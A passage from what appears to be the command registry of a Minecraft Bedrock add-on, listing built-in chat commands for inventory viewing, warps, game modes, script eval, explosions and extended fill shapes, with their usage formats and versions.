    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "offlineinfo", escregexp: { v: "^offlineinfo$" }, formats: [{ format: "offlineinfo <player: playerName>" }], command_version: "1.1.0", description: "", category: ["players"], commandSettingsId: "built-inCommandSettings:offlineinfo" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "offlineuuidinfo", escregexp: { v: "^offlineuuidinfo$" }, formats: [{ format: "offlineuuidinfo <playerUUID: UUID>" }], command_version: "1.1.0", description: "", category: ["players"], commandSettingsId: "built-inCommandSettings:offlineuuidinfo" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "offlineinvsee", escregexp: { v: "^offlineinvsee$" }, formats: [{ format: "offlineinvsee <player: playerName>" }], command_version: "1.2.0", description: "", category: ["players", "invsee"], commandSettingsId: "built-inCommandSettings:offlineinvsee" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "offlineuuidinvsee", escregexp: { v: "^offlineuuidinvsee$" }, formats: [{ format: "offlineuuidinvsee <playerUUID: UUID>" }], command_version: "1.2.0", description: "", category: ["players", "invsee"], commandSettingsId: "built-inCommandSettings:offlineuuidinvsee" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "binvsee", escregexp: { v: "^binvsee$" }, formats: [{ format: "binvsee <dimension: dimensionId|~> <blockLocation: x y z>" }], command_version: "4.1.0", description: "Invsees into a block. ", category: ["invsee"], commandSettingsId: "built-inCommandSettings:binvsee" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "einvsee", escregexp: { v: "^einvsee$" }, formats: [{ format: "einvsee <targetSelector: targetSelector>" }], command_version: "1.6.0", description: "Invsees into and entity's inventory and equipment slots. ", category: ["invsee"], commandSettingsId: "built-inCommandSettings:einvsee" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "einvseeb", escregexp: { v: "^einvseeb$" }, formats: [{ format: "einvseeb <targetSelector: targetSelector>" }], command_version: "1.6.0", description: "The original version of the \\einvsee command that does not scan equipment slots. ", category: ["invsee"], commandSettingsId: "built-inCommandSettings:einvseeb" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "invseeuuidmode", escregexp: { v: "^invseeuuidmode$" }, formats: [{ format: "invseeuuidmode <entityUUID: UUID>" }], command_version: "1.2.0", description: "Invsees into he entity matching the inputted UUID. ", category: ["invsee"], commandSettingsId: "built-inCommandSettings:invseeuuidmode" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "h#", escregexp: { v: "^h(\\d*)$" }, formats: [{ format: "h<presetId: float> <containerRow: float>" }], command_version: "1.0.0-beta.1", description: "Swaps your hotbar with the specified hotbar preset. ", category: ["containers/inventories"], commandSettingsId: "built-inCommandSettings:h#" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "hset", escregexp: { v: "^hset$" }, formats: [{ format: "hset <presetId: float> [dimensionId: string] [x: float] [y: float] [z: float]" }], command_version: "1.0.0-beta.10", description: "Sets the specified hotbar preset to the specified location. ", category: ["containers/inventories"], commandSettingsId: "built-inCommandSettings:hset" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "gmc", escregexp: { v: "^gmc$" }, formats: [{ format: "gmc" }], command_version: "1.0.0", description: "", category: ["players"], commandSettingsId: "built-inCommandSettings:gmc" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "gms", escregexp: { v: "^gms$" }, formats: [{ format: "gms" }], command_version: "1.0.0", description: "", category: ["misc"], commandSettingsId: "built-inCommandSettings:gms" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "gma", escregexp: { v: "^gma$" }, formats: [{ format: "gma" }], command_version: "1.0.0", description: "", category: ["misc"], commandSettingsId: "built-inCommandSettings:gma" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "gmd", escregexp: { v: "^gmd$" }, formats: [{ format: "gmd" }], command_version: "1.0.0", description: "", category: ["misc"], commandSettingsId: "built-inCommandSettings:gmd" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "gmp", escregexp: { v: "^gmp$" }, formats: [{ format: "gmp" }], command_version: "1.0.0", description: "", category: ["misc"], commandSettingsId: "built-inCommandSettings:gmp" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "gmr", escregexp: { v: "^gmr$" }, formats: [{ format: "gmr" }], command_version: "1.0.0", description: "", category: ["misc"], commandSettingsId: "built-inCommandSettings:gmr" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "getuuid", escregexp: { v: "^getuuid$" }, formats: [{ format: "getuuid <targetSelector: targetSelector>" }], command_version: "1.0.0", description: "", category: ["entities"], commandSettingsId: "built-inCommandSettings:getuuid" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "warpset", escregexp: { v: "^warpset$" }, formats: [{ format: "warpset <dimension: dimension|~> <x: float|~> <y: float|~> <z: float|~> <name: escapableString>" }], command_version: "1.1.0", description: "", category: ["warps"], commandSettingsId: "built-inCommandSettings:warpset" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "warp", escregexp: { v: "^warp$" }, formats: [{ format: "warp <warpName: escapableString>" }], command_version: "1.1.0", description: "", category: ["warps"], commandSettingsId: "built-inCommandSettings:warp" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "warpremove", escregexp: { v: "^warpremove$" }, formats: [{ format: "warpremove <warpName: escapableString>" }], command_version: "1.0.0", description: "", category: ["warps"], commandSettingsId: "built-inCommandSettings:warpremove" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "warpreset", escregexp: { v: "^warpreset$" }, formats: [{ format: "warpreset" }], command_version: "1.0.0", description: "", category: ["warps"], commandSettingsId: "built-inCommandSettings:warpreset" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "warplist", escregexp: { v: "^warplist$" }, formats: [{ format: "warlist" }], command_version: "1.0.0", description: "", category: ["warps"], commandSettingsId: "built-inCommandSettings:warplist" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "warplistdetails", escregexp: { v: "^warplistdetails$" }, formats: [{ format: "warplistdetails" }], command_version: "1.0.0", description: "", category: ["warps"], commandSettingsId: "built-inCommandSettings:warplistdetails" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "warplistrawdata", escregexp: { v: "^warplistrawdata$" }, formats: [{ format: "warplistrawdata" }], command_version: "1.0.0", description: "", category: ["warps"], commandSettingsId: "built-inCommandSettings:warplistrawdata" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "wset", escregexp: { v: "^wset$" }, formats: [{ format: "wset <dimension: dimension|~> <x: float|~> <y: float|~> <z: float|~> <name: escapableString>" }], command_version: "1.1.0", description: "", category: ["warps"], commandSettingsId: "built-inCommandSettings:wset" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "w", escregexp: { v: "^w$" }, formats: [{ format: "w <wName: escapableString>" }], command_version: "1.1.0", description: "", category: ["warps"], commandSettingsId: "built-inCommandSettings:w" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "wremove", escregexp: { v: "^wremove$" }, formats: [{ format: "wremove <wName: escapableString>" }], command_version: "1.0.0", description: "", category: ["warps"], commandSettingsId: "built-inCommandSettings:wremove" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "wreset", escregexp: { v: "^wreset$" }, formats: [{ format: "wreset" }], command_version: "1.0.0", description: "", category: ["warps"], commandSettingsId: "built-inCommandSettings:wreset" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "wlist", escregexp: { v: "^wlist$" }, formats: [{ format: "wlist" }], command_version: "1.0.0", description: "", category: ["warps"], commandSettingsId: "built-inCommandSettings:wlist" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "wlistdetails", escregexp: { v: "^wlistdetails$" }, formats: [{ format: "wlistdetails" }], command_version: "1.0.0", description: "", category: ["warps"], commandSettingsId: "built-inCommandSettings:wlistdetails" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "wlistrawdata", escregexp: { v: "^wlistrawdata$" }, formats: [{ format: "wlistrawdata" }], command_version: "1.0.0", description: "", category: ["warps"], commandSettingsId: "built-inCommandSettings:wlistrawdata" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "run", escregexp: { v: "^run$" }, formats: [{ format: "run <tickDelay: int>=1> <command: command>" }], command_version: "1.0.0", description: "", category: ["misc"], commandSettingsId: "built-inCommandSettings:run" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "eval", escregexp: { v: "^eval$" }, formats: [{ format: "eval <script: JavaScript>" }], command_version: "1.1.0", description: "", category: ["misc"], commandSettingsId: "built-inCommandSettings:eval" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "top", escregexp: { v: "^top$" }, formats: [{ format: "top" }], command_version: "1.0.0", description: "", category: ["world"], commandSettingsId: "built-inCommandSettings:top" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "up", escregexp: { v: "^up$" }, formats: [{ format: "up [placeGlass: boolean]" }], command_version: "1.0.0", description: "", category: ["world"], commandSettingsId: "built-inCommandSettings:up" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "printlayers", escregexp: { v: "^printlayers$" }, formats: [{ format: "printlayers" }], command_version: "1.0.0", description: "", category: ["world"], commandSettingsId: "built-inCommandSettings:printlayers" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "managescriptautoeval", escregexp: { v: "^managescriptautoeval$" }, formats: [{ format: "managescriptautoeval" }], command_version: "1.0.0", description: "", category: ["uis"], commandSettingsId: "built-inCommandSettings:managescriptautoeval" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "mainmenu", escregexp: { v: "^mainmenu$" }, aliases: [{ commandName: "menu", escregexp: { v: "^menu$" } }], formats: [{ format: "mainmenu" }], command_version: "2.0.0", description: "", category: ["uis"], commandSettingsId: "built-inCommandSettings:mainmenu" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "terminal", escregexp: { v: "^terminal$" }, aliases: [{ commandName: "cmdrunner", escregexp: { v: "^cmdrunner$" } }], formats: [{ format: "terminal" }], command_version: "1.0.0", description: "", category: ["uis"], commandSettingsId: "built-inCommandSettings:terminal" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "managecommands", escregexp: { v: "^managecommands$" }, aliases: [{ commandName: "mngcmds", escregexp: { v: "^mngcmds$" } }], formats: [{ format: "managecommands" }], command_version: "1.0.0", description: "", category: ["uis"], commandSettingsId: "built-inCommandSettings:managecommands" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "manageplayers", escregexp: { v: "^manageplayers$" }, aliases: [{ commandName: "mngplyrs", escregexp: { v: "^mngplyrs$" } }], formats: [{ format: "manageplayers" }], command_version: "1.0.0", description: "", category: ["uis"], commandSettingsId: "built-inCommandSettings:manageplayers" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "settings", escregexp: { v: "^settings$" }, formats: [{ format: "settings" }], command_version: "2.0.0", description: "", category: ["uis"], commandSettingsId: "built-inCommandSettings:settings" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "datapickblock", escregexp: { v: "^datapickblock$" }, aliases: [{ commandName: "dpb", escregexp: { v: "^dpb$" } }], formats: [{ format: "datapickblock" }], command_version: "1.0.0", category: ["world"], description: "", commandSettingsId: "built-inCommandSettings:datapickblock" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "createexplosion", escregexp: { v: "^createexplosion$" }, formats: [{ format: "createexplosion <location: x y z> <dimension: string> [radius: float] [allowUnderwater: bool] [breaksBlocks: bool] [causesFire: bool] [source: targetSelector]" }], command_version: "1.0.0-rc.57", description: "Creates an explosion. ", category: ["world"], commandSettingsId: "built-inCommandSettings:createexplosion" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "fill", escregexp: { v: "^fill$" }, formats: [{ format: "fill <from: x y z> <to: x y z> <tileName: Block> <blockStates: block states|JSON|Array> [replaceTileName: Block] [replaceBlockStates: block states|JSON|Array]" }, { format: "fill <from: x y z> <to: x y z> <tileName: Block> [replaceTileName: Block] [replaceBlockStates: block states|JSON|Array]" }], command_version: "1.1.0-rc.9", description: "Better version fo the vanilla /fill command that can fill secret blocks types that normally require an nbt editor to obtain. ", category: ["world"], commandSettingsId: "built-inCommandSettings:fill" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "ifill", escregexp: { v: "^ifill$" }, formats: [{ format: "ifill <from: x y z> <to: x y z> <tileName: Block> <blockStates: block states|JSON|Array> [replaceTileName: Block] [replaceBlockStates: block states|JSON|Array]" }, { format: "ifill <from: x y z> <to: x y z> <tileName: Block> [replaceTileName: Block] [replaceBlockStates: block states|JSON|Array]" }], command_version: "31.0.1-beta.99", description: "Better version of the vanilla /fill command that can fill secret blocks types that normally require an nbt editor to obtain, and has no fill size limits. ", category: ["world"], commandSettingsId: "built-inCommandSettings:ifill" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "itfill", escregexp: { v: "^itfill$" }, formats: [
            "itfill <from: x y z> <to: x y z> <tileName: Block> <blockStates: block states> <ifillMode: replace|fill|cube|keep|walls|hollow|outline|pillars§c|floor|ceilling|diamond|hourglass§r> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]",
            "itfill <from: x y z> <to: x y z> <tileName: Block> <blockStates: block states> <ifillMode: replace|fill|cube|keep|walls|hollow|outline|pillars§c|floor|ceilling|diamond|hourglass§r> <reaplceTileName: Block> [clearContainers: boolean]",
            "itfill <from: x y z> <to: x y z> <tileName: Block> <blockStates: block states> [ifillMode: replace|fill|cube|keep|walls|hollow|outline|pillars§c|floor|ceilling|diamond|hourglass§r] [clearContainers: boolean]",
            "itfill <from: x y z> <to: x y z> <tileName: Block> <blockStates: block states> [clearContainers: boolean]",
            "itfill <from: x y z> <to: x y z> <tileName: Block> <ifillMode: replace|fill|cube|keep|walls|hollow|outline|pillars§c|floor|ceilling|diamond|hourglass§r> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]",
            "itfill <from: x y z> <to: x y z> <tileName: Block> <ifillMode: replace|fill|cube|keep|walls|hollow|outline|pillars§c|floor|ceilling|diamond|hourglass§r> <reaplceTileName: Block> [clearContainers: boolean]",
            "itfill <from: x y z> <to: x y z> <tileName: Block> [ifillMode: replace|fill|cube|keep|walls|hollow|outline|pillars§c|floor|ceilling|diamond|hourglass§r] [clearContainers: boolean]",
            "itfill <from: x y z> <to: x y z> <tileName: Block> [clearContainers: boolean]",
            "itfill <from: x y z> <to: x y z> <skygridSize: float> <tileName: Block> <blockStates: block states> <mode: skygrid|inverseskygrid> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]",
            "itfill <from: x y z> <to: x y z> <skygridSize: float> <tileName: Block> <blockStates: block states> <mode: skygrid|inverseskygrid> <reaplceTileName: Block> [clearContainers: boolean]",
            "itfill <from: x y z> <to: x y z> <skygridSize: float> <tileName: Block> <blockStates: block states> <mode: skygrid|inverseskygrid> [clearContainers: boolean]",
            "itfill <from: x y z> <to: x y z> <skygridSize: float> <tileName: Block> <blockStates: block states> <mode: skygrid|inverseskygrid> [clearContainers: boolean]",
            "itfill <from: x y z> <to: x y z> <skygridSize: float> <tileName: Block> <mode: skygrid|inverseskygrid> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]",
            "itfill <from: x y z> <to: x y z> <skygridSize: float> <tileName: Block> <mode: skygrid|inverseskygrid> <reaplceTileName: Block> [clearContainers: boolean]",
            "itfill <from: x y z> <to: x y z> <skygridSize: float> <tileName: Block> <mode: skygrid|inverseskygrid> [clearContainers: boolean]",
            "itfill <from: x y z> <to: x y z> <tileName: Block> [clearContainers: boolean]",
            "itfill <from: x y z> <to: x y z> clear [clearContainers: boolean]",
            "itfill <from: x y z> <to: x y z> drain",
            "itfill <center: x y z> <radius: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <blockStates: block states> circle [replaceTileName: Block] [replaceBlockStates: block states] [clearContainers: boolean]",
            "itfill <center: x y z> <radius: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <blockStates: block states> circle [replaceTileName: Block] [clearContainers: boolean]",
            "itfill <center: x y z> <radius: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <blockStates: block states> circle [clearContainers: boolean]",
            "itfill <center: x y z> <radius: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> circle [replaceTileName: Block] [replaceBlockStates: block states] [clearContainers: boolean]",
            "itfill <center: x y z> <radius: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> circle [replaceTileName: Block] [clearContainers: boolean]",
            "itfill <center: x y z> <radius: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> circle [clearContainers: boolean]",
            "itfill <center: x y z> <radius: float> <tileName: Block> <blockStates: block states> <mode: circlex|circley|circlez|circlexy|circleyz|circlexyz|sphere|semisphere> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]",
            "itfill <center: x y z> <radius: float> <tileName: Block> <blockStates: block states> <mode: circlex|circley|circlez|circlexy|circleyz|circlexyz|sphere|semisphere> <replaceTileName: Block> [clearContainers: boolean]",
            "itfill <center: x y z> <radius: float> <tileName: Block> <blockStates: block states> <mode: circlex|circley|circlez|circlexy|circleyz|circlexyz|sphere|semisphere> [clearContainers: boolean]",
            "itfill <center: x y z> <radius: float> <tileName: Block> <mode: circlex|circley|circlez|circlexy|circleyz|circlexyz|sphere|semisphere> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]",
            "itfill <center: x y z> <radius: float> <tileName: Block> <mode: circlex|circley|circlez|circlexy|circleyz|circlexyz|sphere|semisphere> <replaceTileName: Block> [clearContainers: boolean]",
            "itfill <center: x y z> <radius: float> <tileName: Block> <mode: circlex|circley|circlez|circlexy|circleyz|circlexyz|sphere|semisphere> [clearContainers: boolean]",
            "itfill <center: x y z> <radius: float> <thickness: float> <tileName: Block> <blockStates: block states> <mode: hollowsphere|dome> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]",
            "itfill <center: x y z> <radius: float> <thickness: float> <tileName: Block> <blockStates: block states> <mode: hollowsphere|dome> <replaceTileName: Block> [clearContainers: boolean]",
            "itfill <center: x y z> <radius: float> <thickness: float> <tileName: Block> <blockStates: block states> <mode: hollowsphere|dome> [clearContainers: boolean]",
            "itfill <center: x y z> <radius: float> <thickness: float> <tileName: Block> <mode: hollowsphere|dome> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]",
            "itfill <center: x y z> <radius: float> <thickness: float> <tileName: Block> <mode: hollowsphere|dome> <replaceTileName: Block> [clearContainers: boolean]",
            "itfill <center: x y z> <radius: float> <thickness: float> <tileName: Block> <mode: hollowsphere|dome> [clearContainers: boolean]",
            "itfill <center: x y z> <radius: float> <length: float> <tileName: Block> <blockStates: block states> <mode: cylinderx|cylindery|cylinderz|cylinderxy|cylinderyz|cylinderxz|cylinderxyz> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]",
            "itfill <center: x y z> <radius: float> <length: float> <tileName: Block> <blockStates: block states> <mode: cylinderx|cylindery|cylinderz|cylinderxy|cylinderyz|cylinderxz|cylinderxyz> <replaceTileName: Block> [clearContainers: boolean]",
            "itfill <center: x y z> <radius: float> <length: float> <tileName: Block> <blockStates: block states> <mode: cylinderx|cylindery|cylinderz|cylinderxy|cylinderyz|cylinderxz|cylinderxyz> [clearContainers: boolean]",
            "itfill <center: x y z> <radius: float> <length: float> <tileName: Block> <mode: cylinderx|cylindery|cylinderz|cylinderxy|cylinderyz|cylinderxz|cylinderxyz> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]",
            "itfill <center: x y z> <radius: float> <length: float> <tileName: Block> <mode: cylinderx|cylindery|cylinderz|cylinderxy|cylinderyz|cylinderxz|cylinderxyz> <replaceTileName: Block> [clearContainers: boolean]",
            "itfill <center: x y z> <radius: float> <length: float> <tileName: Block> <mode: cylinderx|cylindery|cylinderz|cylinderxy|cylinderyz|cylinderxz|cylinderxyz> [clearContainers: boolean]",
            "itfill <center: x y z> <radius: float> <length: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <blockStates: block states> <mode: tunnel|cylinder> [replaceTileName: Block] [replaceBlockStates: block states] [clearContainers: boolean]",
            "itfill <center: x y z> <radius: float> <length: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <blockStates: block states> <mode: tunnel|cylinder> [replaceTileName: Block] [clearContainers: boolean]",
            "itfill <center: x y z> <radius: float> <length: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <blockStates: block states> <mode: tunnel|cylinder> [clearContainers: boolean]",
            "itfill <center: x y z> <radius: float> <length: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <mode: tunnel|cylinder> [replaceTileName: Block] [replaceBlockStates: block states] [clearContainers: boolean]",
            "itfill <center: x y z> <radius: float> <length: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <mode: tunnel|cylinder> [replaceTileName: Block] [clearContainers: boolean]",
            "itfill <center: x y z> <radius: float> <length: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <mode: tunnel|cylinder> [clearContainers: boolean]",
            "itfill <center: x y z> <radius: x y z> <offset: x y z> <length: float> <tileName: Block> <blockStates: block states> hollowovoid [replaceTileName: Block] [replaceBlockStates: block states] [clearContainers: boolean]",
            "itfill <center: x y z> <radius: x y z> <offset: x y z> <length: float> <tileName: Block> <blockStates: block states> hollowovoid [replaceTileName: Block] [clearContainers: boolean]",
            "itfill <center: x y z> <radius: x y z> <offset: x y z> <length: float> <tileName: Block> <blockStates: block states> hollowovoid [clearContainers: boolean]",
            "itfill <center: x y z> <radius: x y z> <offset: x y z> <length: float> <tileName: Block> hollowovoid [replaceTileName: Block] [replaceBlockStates: block states] [clearContainers: boolean]",
            "itfill <center: x y z> <radius: x y z> <offset: x y z> <length: float> <tileName: Block> hollowovoid [replaceTileName: Block] [clearContainers: boolean]",
            "itfill <center: x y z> <radius: x y z> <offset: x y z> <length: float> <tileName: Block> hollowovoid [clearContainers: boolean]"
        ], command_version: "29.0.1-beta.99", description: "Same as the \\ifill command except for the fact that it temporarily spawns a tickingarea to load in the chunks where the blocks will be filled. ", category: ["world"], commandSettingsId: "built-inCommandSettings:itfill" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "idtfill", escregexp: { v: "^idtfill$" }, formats: [
            "idtfill <from: x y z> <to: x y z> <integrity: float> <tileName: Block> <blockStates: block states> <ifillMode: replace|fill|cube|keep|walls|hollow|outline|pillars§c|floor|ceilling|diamond|hourglass§r> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]",
            "idtfill <from: x y z> <to: x y z> <integrity: float> <tileName: Block> <blockStates: block states> <ifillMode: replace|fill|cube|keep|walls|hollow|outline|pillars§c|floor|ceilling|diamond|hourglass§r> <reaplceTileName: Block> [clearContainers: boolean]",
            "idtfill <from: x y z> <to: x y z> <integrity: float> <tileName: Block> <blockStates: block states> [ifillMode: replace|fill|cube|keep|walls|hollow|outline|pillars§c|floor|ceilling|diamond|hourglass§r] [clearContainers: boolean]",
            "idtfill <from: x y z> <to: x y z> <integrity: float> <tileName: Block> <blockStates: block states> [clearContainers: boolean]",
            "idtfill <from: x y z> <to: x y z> <integrity: float> <tileName: Block> <ifillMode: replace|fill|cube|keep|walls|hollow|outline|pillars§c|floor|ceilling|diamond|hourglass§r> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]",
            "idtfill <from: x y z> <to: x y z> <integrity: float> <tileName: Block> <ifillMode: replace|fill|cube|keep|walls|hollow|outline|pillars§c|floor|ceilling|diamond|hourglass§r> <reaplceTileName: Block> [clearContainers: boolean]",
            "idtfill <from: x y z> <to: x y z> <integrity: float> <tileName: Block> [ifillMode: replace|fill|cube|keep|walls|hollow|outline|pillars§c|floor|ceilling|diamond|hourglass§r] [clearContainers: boolean]",
            "idtfill <from: x y z> <to: x y z> <integrity: float> <tileName: Block> [clearContainers: boolean]",
            "idtfill <from: x y z> <to: x y z> <integrity: float> <skygridSize: float> <tileName: Block> <blockStates: block states> <mode: skygrid|inverseskygrid> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]",
            "idtfill <from: x y z> <to: x y z> <integrity: float> <skygridSize: float> <tileName: Block> <blockStates: block states> <mode: skygrid|inverseskygrid> <reaplceTileName: Block> [clearContainers: boolean]",
            "idtfill <from: x y z> <to: x y z> <integrity: float> <skygridSize: float> <tileName: Block> <blockStates: block states> <mode: skygrid|inverseskygrid> [clearContainers: boolean]",
            "idtfill <from: x y z> <to: x y z> <integrity: float> <skygridSize: float> <tileName: Block> <blockStates: block states> <mode: skygrid|inverseskygrid> [clearContainers: boolean]",
            "idtfill <from: x y z> <to: x y z> <integrity: float> <skygridSize: float> <tileName: Block> <mode: skygrid|inverseskygrid> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]",
            "idtfill <from: x y z> <to: x y z> <integrity: float> <skygridSize: float> <tileName: Block> <mode: skygrid|inverseskygrid> <reaplceTileName: Block> [clearContainers: boolean]",
            "idtfill <from: x y z> <to: x y z> <integrity: float> <skygridSize: float> <tileName: Block> <mode: skygrid|inverseskygrid> [clearContainers: boolean]",
            "idtfill <from: x y z> <to: x y z> <integrity: float> <tileName: Block> [clearContainers: boolean]",
            "idtfill <from: x y z> <to: x y z> <integrity: float> clear [clearContainers: boolean]",
            "idtfill <from: x y z> <to: x y z> <integrity: float> drain",
            "idtfill <center: x y z> <integrity: float> <radius: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <blockStates: block states> circle [replaceTileName: Block] [replaceBlockStates: block states] [clearContainers: boolean]",
            "idtfill <center: x y z> <integrity: float> <radius: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <blockStates: block states> circle [replaceTileName: Block] [clearContainers: boolean]",
            "idtfill <center: x y z> <integrity: float> <radius: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <blockStates: block states> circle [clearContainers: boolean]",
            "idtfill <center: x y z> <integrity: float> <radius: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> circle [replaceTileName: Block] [replaceBlockStates: block states] [clearContainers: boolean]",
            "idtfill <center: x y z> <integrity: float> <radius: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> circle [replaceTileName: Block] [clearContainers: boolean]",
            "idtfill <center: x y z> <integrity: float> <radius: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> circle [clearContainers: boolean]",
            "idtfill <center: x y z> <integrity: float> <radius: float> <tileName: Block> <blockStates: block states> <mode: circlex|circley|circlez|circlexy|circleyz|circlexyz|sphere|semisphere> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]",
            "idtfill <center: x y z> <integrity: float> <radius: float> <tileName: Block> <blockStates: block states> <mode: circlex|circley|circlez|circlexy|circleyz|circlexyz|sphere|semisphere> <replaceTileName: Block> [clearContainers: boolean]",
            "idtfill <center: x y z> <integrity: float> <radius: float> <tileName: Block> <blockStates: block states> <mode: circlex|circley|circlez|circlexy|circleyz|circlexyz|sphere|semisphere> [clearContainers: boolean]",
            "idtfill <center: x y z> <integrity: float> <radius: float> <tileName: Block> <mode: circlex|circley|circlez|circlexy|circleyz|circlexyz|sphere|semisphere> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]",
            "idtfill <center: x y z> <integrity: float> <radius: float> <tileName: Block> <mode: circlex|circley|circlez|circlexy|circleyz|circlexyz|sphere|semisphere> <replaceTileName: Block> [clearContainers: boolean]",
            "idtfill <center: x y z> <integrity: float> <radius: float> <tileName: Block> <mode: circlex|circley|circlez|circlexy|circleyz|circlexyz|sphere|semisphere> [clearContainers: boolean]",
            "idtfill <center: x y z> <integrity: float> <radius: float> <thickness: float> <tileName: Block> <blockStates: block states> <mode: hollowsphere|dome> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]",
            "idtfill <center: x y z> <integrity: float> <radius: float> <thickness: float> <tileName: Block> <blockStates: block states> <mode: hollowsphere|dome> <replaceTileName: Block> [clearContainers: boolean]",
            "idtfill <center: x y z> <integrity: float> <radius: float> <thickness: float> <tileName: Block> <blockStates: block states> <mode: hollowsphere|dome> [clearContainers: boolean]",
